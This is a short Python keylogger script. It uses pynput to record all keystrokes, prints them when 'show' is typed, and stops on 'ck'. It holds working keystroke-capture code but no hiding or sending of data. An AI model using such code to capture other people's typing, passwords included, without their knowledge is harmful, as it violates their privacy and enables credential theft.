from pynput import keyboard
import time
from multiprocessing import Process
from print_text import *
from time_stamp import *


input_keys = []
memory = {}

def on_press(key):
    try:
        input_keys.append(chr(ord(key.char)))
    except:
        if str(key) == 'Key.space':
            input_keys.append(' ')
        elif str(key) == 'Key.enter':
            input_keys.append('\n')
        else:
            pass

###     stop monitoring or show memory     ###
def on_release(key):
    try:
        show = input_keys[-1] == 'w' and input_keys[-2] == 'o' and input_keys[-3] == 'h' and input_keys[-4] == 's'
        stop = input_keys[-1] == 'c' and input_keys[-2] == 'k'
        if show:
        ###     enter 'show' to view the last memory keys       ###
            for i in range(4):
                input_keys.pop()
            output_text = "".join(input_keys)
            print_text(output_text)
            print_text(memory)
        ###     press "c + k" to stop monitoring       ###
        elif stop:
            print_text('monitoring is stoped !')
            return False
    except:
        pass

###     keyboard listener      ###
def listener():
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()


### run KeyLogger       ###
if __name__ == '__main__':
        listener()
